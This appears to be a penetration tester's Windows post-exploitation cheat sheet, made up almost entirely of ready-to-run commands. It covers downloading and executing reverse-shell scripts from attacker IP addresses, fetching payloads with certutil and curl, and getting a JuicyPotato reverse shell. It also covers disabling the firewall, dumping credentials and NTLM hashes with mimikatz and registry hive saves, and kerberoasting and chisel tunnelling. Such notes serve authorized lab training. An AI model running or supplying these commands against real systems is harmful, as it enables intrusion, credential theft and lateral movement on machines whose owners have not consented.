#### Downloading Files From Powershell
```
powershell -c "Invoke-WebRequest -Uri 'http://10.13.14.198:8000/PrintSpoofer.exe' -OutFile 'C:\Windows\Temp\PrintSpoofer.exe'"

powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.119.188:8000/PrintSpoofer32.exe','PrintSpoofer.exe')"

powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.101:8000/revShell.ps1')
(new-object net.webclient).downloadfile('http://10.10.14.5/rev.bat', 'C:\users\merlin\appdata\local\temp\rev.bat')

powershell -nop -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.101:8000/shell.ps1')"
```

#### Downloading Files From CMD
```
certutil -urlcache -split -f http://192.168.49.76/shell.exe

wget http://192.168.48.182/shell.exe

curl http://192.168.12.23/shell.exe --output shell.exe
```

#### Windows Path Variable
```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

#### Powershell File Search Command
```
(Get-ChildItem -Force -Filter *.js -Recurse).BaseName | Sort length -Descending
```

#### Windows MSF Venom Payloads
```
msfvenom -f dll -p
msfvenom -f exe
```

#### Service Enumeration
```
(Check Service Permissions Command)
./accesschk.exe /accepteula -uwcqv user [service name]

(Check Status of Service Command)
sc qc [service name]

(Start Service Command)
net start [service name]
```

#### Downloading Files with Python
```
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://python-distribute.org/distribute_setup.py', 'distribute_setup.py')"

python -c "from urllib import urlretrieve; urlretrieve('http://python-distribute.org/distribute_setup.py', 'distribute_setup.py')"
```

#### Token Enumeration
```
whoami /priv
```

#### Search Registry Files for Passwords
```
reg query HKLM /f pass /t REG_SZ /s
```

#### Enumerating Firewall Rules
```
netsh advfirewall show currentprofile "To check if firewall is active"

netsh advfirewall firewall show rule name=all "List the current active filewall rules"

netsh advfirewall set currentprofile state off "Command to turn fireall off"
```

#### Basic Juicy Potato Usage
```
./JuicyPotato.exe -t * -p rev.bat -l 4444

rev.bat should contain command to download Invoke-PowerShellTcp.ps1 where at the bottom you have "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.25 -Port 6666"
Then have rev.bat in the same directory then run the command
```

#### Chisel Dynamic Port Forwarding
```
Kali: chisel server -p 9000 -reverse

Client: chisel client  192.168.119.188:9000 R:9001:127.0.0.1:1080 &

Client: chisel server -p 1080  --socks5 &

Kali: chisel client 127.0.0.1:9001 socks
```

#### Enumerating Open Ports
```
(To See what ports are open on this machine with their corresponding PID)
netstat -ano -p tcp 

(Use this command to query the application with the PID 1400)
tasklist |find "1400" 
```

#### Mimikatz Basic Commands
```
privilege::debug

(Dumps SAM hashes)
lsadump::sam 

(Gets logged on useres NTLM hash if we can't crack it we can pass the hash with crackmapexec)
sekurlsa::logonpasswords 

(Exports kerberos tickets for SPN accounts)
kerberos::list /export 
```

#### Dumping Clear Text Passwords with WDigest
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
gpupdate /force
mimikatz.exe
privilege::debug
sekurlsa::wdigest
```

#### Dumping SAM Hashes Manually
```
reg save hklm\sam c:\sam
reg save hklm\system c:\system

(Run this command on linux to get hashes)
samdump2 system sam
```

#### Basic Active Directory Enumeration
```
(Shows local accounts on this machine)
net user

(Shows users that exist in this domain)
net user /domain

(Shows basic information about the user)
net user jeff_admin /domain
```

#### Blood Hound
```
neo4j console
sudo bloodhound

(Run these commands on target machine)
/opt/SharpHound.exe
Invoke-BloodHound -CollectionMethod All -Domain XOR.com
```

#### Finding Computers on the Same Domain
```
Import powerview.ps1
Get-DomainComputer
nslookup xor-dc01.xor.com
```

#### Getting Service Account Passwords
```
Import modules from /opt/kerberoast
./GetUserSPNs.ps1
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "[SPN]"

(Exports kerberos tickets for SPN accounts)
kerberos::list /export
